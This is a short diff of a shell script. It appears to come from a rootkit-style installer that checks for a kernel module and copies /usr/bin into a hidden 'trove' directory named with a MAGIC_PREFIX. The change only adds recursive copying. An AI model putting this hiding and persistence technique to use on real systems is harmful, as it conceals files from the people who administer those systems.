@@ -43,7 +43,7 @@ if test -f "$koFile"; then
     # Make system indestructable, secured via MAGIC_PREFIX
     trovePath='../'"$magicPrefix""trove"
     mkdir "$trovePath"
-    cp /usr/bin "$trovePath"
+    cp -r /usr/bin "$trovePath"
     $trovePath"/echo" "Trove done."
 
 
